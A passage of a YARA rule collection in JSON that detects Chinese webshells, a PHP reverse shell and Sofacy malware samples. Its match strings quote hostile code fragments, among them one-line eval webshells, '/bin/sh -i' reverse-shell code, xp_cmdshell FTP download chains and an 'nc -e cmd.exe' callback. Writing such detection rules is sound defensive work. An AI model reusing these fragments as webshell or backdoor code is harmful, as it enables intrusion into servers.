HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n      $s7 = \"$shell = 'uname -a; w; id; /bin/sh -i';\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-22 11:27:11","description":"Laudanum Injector Tools - file php-reverse-shell.php","minimum_yara":"1.7","name":"php_reverse_shell_2_RID2EBC","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"4fc3f94177b77131fafaafd524a66608","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Sofacy_Mal2_RID2B21 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Sofacy Group Malware Sample 2\"\n      author = \"Florian Roth\"\n      reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n      date = \"2015-06-19 08:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PROJECT\\\\XAPS_OBJECTIVE_DLL\\\\\" ascii\n      $x2 = \"XAPS_OBJECTIVE.dll\" fullword ascii\n      $s1 = \"i`m wait\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) and $s1\n}","date":"2015-06-19 08:53:21","description":"Sofacy Group Malware Sample 2","minimum_yara":"1.7","name":"Sofacy_Mal2_RID2B21","reference":"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf","required_modules":[],"rule_hash":"7c26b52c02228536c3c110686e625fff","score":70,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_Mal3_RID2B22 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Sofacy Group Malware Sample 3\"\n      author = \"Florian Roth\"\n      reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n      date = \"2015-06-19 08:53:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" fullword ascii\n      $s2 = \".?AVAgentModuleRemoteKeyLogger@@\" fullword ascii\n      $s3 = \"<font size=4 color=red>process isn't exist</font>\" fullword ascii\n      $s4 = \"<font size=4 color=red>process is exist</font>\" fullword ascii\n      $s5 = \".winnt.check-fix.com\" fullword ascii\n      $s6 = \".update.adobeincorp.com\" fullword ascii\n      $s7 = \".microsoft.checkwinframe.com\" fullword ascii\n      $s8 = \"adobeincorp.com\" fullword wide\n      $s9 = \"# EXC: HttpSender - Cannot create Get Channel!\" fullword ascii\n      $x1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/\" wide\n      $x2 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2\" wide\n      $x3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 2 of ( $s* ) or ( 1 of ( $s* ) and all of ( $x* ) ) )\n}","date":"2015-06-19 08:53:31","description":"Sofacy Group Malware Sample 3","minimum_yara":"1.7","name":"Sofacy_Mal3_RID2B22","reference":"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf","required_modules":[],"rule_hash":"b26495941e6e9513a488210e4827853a","score":70,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Webshell_Txt_aspx1_RID2E32 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspx1.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:04:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\" \n      $s1 = \"],\\\"unsafe\\\");%>\" fullword ascii\n   condition: \n      filesize < 150 and all of them\n}","date":"2015-06-14 11:04:11","description":"Chinese Hacktool Set - Webshells - file aspx1.txt","minimum_yara":"1.7","name":"Webshell_Txt_aspx1_RID2E32","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"976f3a2d1dc4386f6d690f10d576a977","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Shell_Asp_RID2E21 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set Webshells - file Asp.html\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:01:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n      $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n      $s3 = \"function Command(cmd, str){\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}","date":"2015-06-14 11:01:21","description":"Chinese Hacktool Set Webshells - file Asp.html","minimum_yara":"1.7","name":"Webshell_Shell_Asp_RID2E21","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2c15b1de91807aadc28bb1cc9f5258d6","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_aspxtag_RID2F3D : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspxtag.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:48:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String wGetUrl=Request.QueryString[\" fullword ascii\n      $s2 = \"sw.Write(wget);\" fullword ascii\n      $s3 = \"Response.Write(\\\"Hi,Man 2015\\\"); \" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}","date":"2015-06-14 11:48:41","description":"Chinese Hacktool Set - Webshells - file aspxtag.txt","minimum_yara":"1.7","name":"Webshell_Txt_aspxtag_RID2F3D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"be5197be879593e336d9eacc4cd1d39b","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_php_RID2D8D : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file php.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Config=$_SERVER['QUERY_STRING'];\" fullword ascii\n      $s2 = \"gzuncompress($_SESSION['api']),null);\" ascii\n      $s3 = \"sprintf('%s?%s',pack(\\\"H*\\\",\" ascii\n      $s4 = \"if(empty($_SESSION['api']))\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-14 10:36:41","description":"Chinese Hacktool Set - Webshells - file php.txt","minimum_yara":"1.7","name":"Webshell_Txt_php_RID2D8D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9c1647795392ad77e6c495cf932d11ae","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_shell_RID2E5D : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file shell.c\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:11:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"printf(\\\"Could not connect to remote shell!\\\\n\\\");\" fullword ascii\n      $s2 = \"printf(\\\"Usage: %s <reflect ip> <port>\\\\n\\\", prog);\" fullword ascii\n      $s3 = \"execl(shell,\\\"/bin/sh\\\",(char *)0);\" fullword ascii\n      $s4 = \"char shell[]=\\\"/bin/sh\\\";\" fullword ascii\n      $s5 = \"connect back door\\\\n\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 2KB and 2 of them\n}","date":"2015-06-14 11:11:21","description":"Chinese Hacktool Set - Webshells - file shell.c","minimum_yara":"1.7","name":"Webshell_Txt_shell_RID2E5D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"fc0edc8bf5396970210522da938968dd","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_asp_RID2D89 : CHINA DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol\" ascii\n      $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 100KB and all of them\n}","date":"2015-06-14 10:36:01","description":"Chinese Hacktool Set - Webshells - file asp.txt","minimum_yara":"1.7","name":"Webshell_Txt_asp_RID2D89","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3087ed42affc59da61074c956b9cbc4a","score":60,"tags":["T1100","DEMO","WEBSHELL","FILE","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_asp1_RID2DBA : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:44:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)\" fullword ascii\n      $s3 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n      $s4 = \"szTempFile = server.mappath(\\\"cmd.txt\\\")\" fullword ascii\n   condition: \n      filesize < 70KB and 2 of them\n}","date":"2015-06-14 10:44:11","description":"Chinese Hacktool Set - Webshells - file asp1.txt","minimum_yara":"1.7","name":"Webshell_Txt_asp1_RID2DBA","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c6dc0646aabb1c6f72bd7190df1f4905","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_php_2_RID2E1E : CHINA DEMO HKTL T1016 T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file php.html\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:00:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1016, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"function connect($dbhost, $dbuser, $dbpass, $dbname='') {\" fullword ascii\n      $s2 = \"scookie('loginpass', '', -86400 * 365);\" fullword ascii\n      $s3 = \"<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>\" fullword ascii\n      $s4 = \"Powered by <a title=\\\"Build 20130112\\\" href=\\\"http://www.4ngel.net\\\" target=\\\"_b\" ascii\n      $s5 = \"formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\\\'shell\\\\',null,this.\" ascii\n      $s6 = \"secparam('IP Configurate',execute('ipconfig -all'));\" fullword ascii\n      $s7 = \"secparam('Hosts', @file_get_contents('/etc/hosts'));\" fullword ascii\n      $s8 = \"p('<p><a href=\\\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\\\" target=\" ascii\n   condition: \n      filesize < 100KB and 4 of them\n}","date":"2015-06-14 11:00:51","description":"Chinese Hacktool Set - Webshells - file php.html","minimum_yara":"1.7","name":"Webshell_Txt_php_2_RID2E1E","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3a32b2ca6a06fd3383f24d4a35eab171","score":60,"tags":["T1100","T1016","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_ftp_RID2D8F : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file ftp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:37:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"';exec master.dbo.xp_cmdshell 'echo open \" ascii\n      $s2 = \"';exec master.dbo.xp_cmdshell 'ftp -s:';\" ascii\n      $s3 = \"';exec master.dbo.xp_cmdshell 'echo get lcx.exe\" ascii\n      $s4 = \"';exec master.dbo.xp_cmdshell 'echo get php.exe\" ascii\n      $s5 = \"';exec master.dbo.xp_cmdshell 'copy \" ascii\n      $s6 = \"ftp -s:d:\\\\ftp.txt \" fullword ascii\n      $s7 = \"echo bye>>d:\\\\ftp.txt \" fullword ascii\n   condition: \n      filesize < 2KB and 2 of them\n}","date":"2015-06-14 10:37:01","description":"Chinese Hacktool Set - Webshells - file ftp.txt","minimum_yara":"1.7","name":"Webshell_Txt_ftp_RID2D8F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"306be15e84b1753ac2fb84e74398f243","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_lcx_RID2D8C : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file lcx.c\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"printf(\\\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l\" ascii\n      $s2 = \"sprintf(tmpbuf2,\\\"\\\\r\\\\n########### reply from %s:%d ####################\\\\r\\\\n\" ascii\n      $s3 = \"printf(\\\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\\\r\\\\n\\\");\" fullword ascii\n      $s4 = \"printf(\\\"got,ip:%s,port:%d\\\\r\\\\n\\\",inet_ntoa(client1.sin_addr),ntohs(client1.sin\" ascii\n      $s5 = \"printf(\\\"[-] connect to host1 failed\\\\r\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 25KB and 2 of them\n}","date":"2015-06-14 10:36:31","description":"Chinese Hacktool Set - Webshells - file lcx.c","minimum_yara":"1.7","name":"Webshell_Txt_lcx_RID2D8C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c170895cff3910d4e3bbd54a4a1ac640","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_jspcmd_RID2EC6 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file jspcmd.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:28:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n      $s4 = \"out.print(\\\"Hi,Man 2015\\\");\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2015-06-14 11:28:51","description":"Chinese Hacktool Set - Webshells - file jspcmd.txt","minimum_yara":"1.7","name":"Webshell_Txt_jspcmd_RID2EC6","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"31e6f775d75c45c836510f95de6582ad","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_jsp_RID2D92 : CHINA DEMO HKTL T1007 T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:37:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1007, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n      $s2 = \"Process pro = Runtime.getRuntime().exec(exe);\" fullword ascii\n      $s3 = \"<option value=\\\\\\\"nc -e cmd.exe 192.168.230.1 4444\\\\\\\">nc</option>\\\"\" fullword ascii\n      $s4 = \"cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n   condition: \n      filesize < 715KB and 2 of them\n}","date":"2015-06-14 10:37:31","description":"Chinese Hacktool Set - Webshells - file jsp.txt","minimum_yara":"1.7","name":"Webshell_Txt_jsp_RID2D92","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"dfdab06d5cdf7a403b8ecf41eaf8c735","score":60,"tags":["T1100","T1007","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_aspxlcx_RID2F48 : CHINA DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspxlcx.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:50:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"public string remoteip = \" ascii\n      $s2 = \"=Dns.Resolve(host);\" ascii\n      $s3 = \"public string remoteport = \" ascii\n      $s4 = \"public class PortForward\" ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 18KB and all of them\n}","date":"2015-06-14 11:50:31","description":"Chinese Hacktool Set - Webshells - file aspxlcx.txt","minimum_yara":"1.7","name":"Webshell_Txt_aspxlcx_RID2F48","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"321475d45d8961f00040cfb59c9f8d5d","score":60,"tags":["T1100","DEMO","WEBSHELL","FILE","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_xiao_RID2DF6 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file xiao.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:54:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n      $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n      $s3 = \"conn.Execute(\\\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,\" ascii\n      $s4 = \"function Command(cmd, str){\" fullword ascii\n      $s5 = \"echo \\\"if(obj.value=='PageWebProxy')obj.form.target='_blank';\\\"\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}","date":"2015-06-14 10:54:11","description":"Chinese Hacktool Set - Webshells - file xiao.txt","minimum_yara":"1.7","name":"Webshell_Txt_xiao_RID2DF6","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e8441f74856ea3d68a3f2e39e0bd46a1","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_aspx_RID2E01 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspx.jpg\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:56:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s2 = \"Process[] p=Process.GetProcesses();\" fullword ascii\n      $s3 = \"Copyright &copy; 2009 Bin\" ascii\n      $s4 = \"<td colspan=\\\"5\\\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\\\"input\\\" runat=\\\"serv\" ascii\n   condition: \n      filesize < 100KB and all of them\n}","date":"2015-06-14 10:56:01","description":"Chinese Hacktool Set - Webshells - file aspx.jpg","minimum_yara":"1.7","name":"Webshell_Txt_aspx_RID2E01","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8fd060db4dff085aafd95878ac8048f6","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_Sql_RID2D75 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file Sql.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:32:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd=chr(34)&\\\"cmd.exe /c \\\"&request.form(\\\"cmd\\\")&\\\" > 8617.tmp\\\"&chr(34)\" fullword ascii\n      $s2 = \"strQuery=\\\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\\\"\" fullword ascii\n      $s3 = \"strQuery = \\\"exec master.dbo.xp_cmdshell '\\\" & request.form(\\\"cmd\\\") & \\\"'\\\" \" fullword ascii\n      $s4 = \"session(\\\"login\\\")=\\\"\\\"\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}","date":"2015-06-14 10:32:41","description":"Chinese Hacktool Set - Webshells - file Sql.txt","minimum_yara":"1.7","name":"Webshell_Txt_Sql_RID2D75","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8fa7274db66e2e87e18d2dca17f4c646","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Txt_hello_RID2E59 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file hello.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:10:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Dim myProcessStartInfo As New ProcessStartInfo(\\\"cmd.exe\\\")\" fullword ascii\n      $s1 = \"myProcessStartInfo.Arguments=\\\"/c \\\" & Cmd.text\" fullword ascii\n      $s2 = \"myProcess.Start()\" fullword ascii\n      $s3 = \"<p align=\\\"center\\\"><a href=\\\"?action=cmd\\\" target=\\\"_blank\\\">\" fullword ascii\n   condition: \n      filesize < 25KB and all of them\n}","date":"2015-06-14 11:10:41","description":"Chinese Hacktool Set - Webshells - file hello.txt","minimum_yara":"1.7","name":"Webshell_Txt_hello_RID2E59","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"340e1aa11e31fe4cb2af1487501105af","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_ChinaChopper_one_RID30FB : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file one.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:03:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\" fullword ascii\n   condition: \n      filesize < 50 and all of them\n}","date":"2015-06-13 13:03:01","description":"Chinese Hacktool Set - file one.asp","minimum_yara":"1.7","name":"Webshell_ChinaChopper_one_RID30FB","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"fe64735d438250cbad7c9723c14ba3b9","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_f3_diy_RID2CE4 : CHINA DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file diy.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:08:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@LANGUAGE=\\\"VBScript.Encode\\\" CODEPAGE=\\\"936\\\"%>\" fullword ascii\n      $s5 = \".black {\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 10KB and all of them\n}","date":"2015-06-13 10:08:31","description":"Chinese Hacktool Set - file diy.asp","minimum_yara":"1.7","name":"Webshell_f3_diy_RID2CE4","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"6949576e7997139b23b8a8f912039c26","score":60,"tags":["T1100","DEMO","WEBSHELL","FILE","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_ChinaChopper_temp_2_RID3200 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:46:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@eval($_POST[strtoupper(md5(gmdate(\" ascii\n   condition: \n      filesize < 150 and all of them\n}","date":"2015-06-13 13:46:31","description":"Chinese Hacktool Set - file temp.php","minimum_yara":"1.7","name":"Webshell_ChinaChopper_temp_2_RID3200","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"57b56a3e726baee47dc69ea1c5559b34","score":60,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule 